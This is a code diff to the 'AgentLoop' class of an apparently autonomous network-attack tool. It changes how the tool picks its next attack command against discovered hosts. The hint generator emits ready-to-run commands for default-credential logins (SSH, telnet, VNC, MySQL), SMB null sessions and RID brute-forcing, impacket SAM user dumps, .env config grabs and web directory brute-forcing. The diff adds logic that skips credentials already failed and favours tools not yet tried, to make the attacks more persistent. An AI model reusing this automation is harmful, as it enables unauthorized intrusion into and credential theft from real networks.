@@ -616,9 +616,9 @@ class AgentLoop:
 
                             # Heavy weight toward high-priority (confirmed access)
                             r = _random.random()
-                            if high and r < 0.50:
+                            if high and r < 0.60:
                                 suggested = _random.choice(high)
-                            elif medium and r < 0.85:
+                            elif medium and r < 0.90:
                                 suggested = _random.choice(medium)
                             elif low:
                                 suggested = _random.choice(low)
@@ -1058,50 +1058,63 @@ class AgentLoop:
     def _exploit_hint(ip: str, ports: set) -> str:
         """Generate exploit-phase hint: smart, varied attacks matched to ports.
 
-        Includes: default creds, searchsploit, nmap vuln scripts, impacket,
-        web probing, directory busting. Randomized to prevent repetition.
+        Filters out creds already tried on this host. Boosts untried tools
+        (impacket, nikto, gobuster) with 80% probability if never used.
         """
         import random as _r
-        hints = []
 
-        # Version-based CVE lookup (always useful)
+        # Get host memory to filter failed creds and check untried tools
+        _mac = ""
+        for _h in db.get_hosts():
+            if _h["ip"] == ip:
+                _mac = _h.get("mac", "")
+                break
+        failed = set()
+        tried = set()
+        if _mac:
+            failed = set(host_memory.get_failed_attacks(_mac))
+            tried = set(host_memory.get_tried_actions(_mac))
+
+        hints = []
+        priority_hints = []  # untried tools get boosted
+
+        # SSH
         if 22 in ports:
-            hints.extend([
-                f"Try: nmap -T2 --script=ssh-auth-methods -p 22 {ip} (SSH auth check). ",
-                f"Try: nmap -T2 --script=vulners -p 22 {ip} (CVE scan SSH). ",
-                f"Try: nxc ssh {ip} -u pi -p raspberry (Pi default). ",
-                f"Try: nxc ssh {ip} -u root -p root (SSH default). ",
-                f"Try: nxc ssh {ip} -u admin -p admin (SSH default). ",
-                f"Try: sshpass -p 'raspberry' ssh -o StrictHostKeyChecking=no pi@{ip}. ",
-                f"Try: nxc ssh {ip} -u root -p /usr/share/wordlists/nmap.lst (wordlist). ",
-            ])
+            hints.append(f"Try: nmap -T2 --script=vulners -p 22 {ip} (CVE scan SSH). ")
+            hints.append(f"Try: nmap -T2 --script=ssh-auth-methods -p 22 {ip} (SSH auth check). ")
+            # Only suggest creds NOT already failed
+            if not any("SSH pi:raspberry" in f for f in failed):
+                hints.append(f"Try: nxc ssh {ip} -u pi -p raspberry (Pi default). ")
+            if not any("SSH root:root" in f for f in failed):
+                hints.append(f"Try: nxc ssh {ip} -u root -p root (SSH default). ")
+            if not any("SSH admin:admin" in f for f in failed):
+                hints.append(f"Try: nxc ssh {ip} -u admin -p admin (SSH default). ")
         if 23 in ports:
             hints.extend([
                 f"Try: nxc telnet {ip} -u admin -p admin (telnet default). ",
                 f"Try: nxc telnet {ip} -u root -p root (telnet default). ",
             ])
         if ports & {445, 139}:
-            hints.extend([
-                f"Try: nmap -T2 --script=smb-vuln* -p 445 {ip} (SMB vuln scan). ",
-                f"Try: nxc smb {ip} -u '' -p '' --shares (null session). ",
-                f"Try: nxc smb {ip} -u guest -p '' --shares --rid-brute (guest+RID). ",
-                f"Try: enum4linux -a {ip} (full SMB enum). ",
-                f"Try: impacket-samrdump {ip} (SAM user dump). ",
-                f"Try: impacket-rpcdump {ip} (RPC endpoints). ",
-                f"Try: impacket-samrdump {ip} (enumerate SAM users). ",
-            ])
+            hints.append(f"Try: nmap -T2 --script=smb-vuln* -p 445 {ip} (SMB vuln scan). ")
+            hints.append(f"Try: nxc smb {ip} -u '' -p '' --shares --rid-brute (null+RID). ")
+            # Boost impacket if never tried on this host
+            if not any("impacket-samrdump" in t for t in tried):
+                priority_hints.append(f"Try: impacket-samrdump {ip} (enumerate SAM users). ")
+            if not any("impacket-rpcdump" in t for t in tried):
+                priority_hints.append(f"Try: impacket-rpcdump {ip} (RPC endpoints). ")
+            if not any("enum4linux" in t for t in tried):
+                priority_hints.append(f"Try: enum4linux -a {ip} (full SMB enum). ")
         if ports & {80, 443, 8080, 8888}:
             p = min(ports & {80, 443, 8080, 8888})
             pp = "" if p == 80 else f":{p}"
-            hints.extend([
-                f"Try: curl -s http://{ip}{pp}/robots.txt (hidden paths). ",
-                f"Try: curl -s http://{ip}{pp}/.env (leaked config). ",
-                f"Try: curl -s http://{ip}{pp}/admin/ -u admin:admin (admin panel). ",
-                f"Try: curl -s http://{ip}{pp}/server-status (Apache status). ",
-                f"Try: gobuster dir -u http://{ip}{pp} -w /usr/share/wordlists/dirb/common.txt -q -t 5. ",
-                f"Try: dirb http://{ip}{pp} /usr/share/wordlists/dirb/small.txt -S (dir brute). ",
-                f"Try: nmap -T2 --script=http-vuln* -p {p} {ip} (HTTP vuln scan). ",
-            ])
+            hints.append(f"Try: curl -s http://{ip}{pp}/robots.txt (hidden paths). ")
+            hints.append(f"Try: curl -s http://{ip}{pp}/.env (leaked config). ")
+            hints.append(f"Try: nmap -T2 --script=http-vuln* -p {p} {ip} (HTTP vuln scan). ")
+            # Boost nikto/gobuster if never tried
+            if not any("nikto" in t for t in tried):
+                priority_hints.append(f"Try: nikto -h http://{ip}{pp} -Tuning 1 -maxtime 60s (web vuln scan). ")
+            if not any("gobuster" in t or "dirb" in t for t in tried):
+                priority_hints.append(f"Try: gobuster dir -u http://{ip}{pp} -w /usr/share/wordlists/dirb/common.txt -q -t 5. ")
         if 5900 in ports:
             hints.extend([
                 f"Try: nxc vnc {ip} -p password (VNC default). ",
@@ -1123,12 +1136,19 @@ class AgentLoop:
             if 3306 in ports:
                 hints.append(f"Try: nxc mysql {ip} -u root -p root (MySQL default). ")
 
-        if not hints:
+        if not hints and not priority_hints:
             hints = [
                 f"Try: nmap -T2 --script=vulners -p {min(ports)} {ip} (CVE scan). ",
-                f"Try: nmap -T2 --script=vulners -p 22 {ip} (CVE scan). ",
             ]
-        return _r.choice(hints)
+
+        # 80% chance to pick untried priority tools if available
+        if priority_hints and _r.random() < 0.80:
+            return _r.choice(priority_hints)
+        if hints:
+            return _r.choice(hints)
+        if priority_hints:
+            return _r.choice(priority_hints)
+        return f"Try: nmap -T2 --script=vulners -p 22 {ip} (CVE scan). "
 
     def _get_playbook(self, ip: str, mac: str, ports: set) -> dict:
         """Find a matching playbook for this host based on observations."""
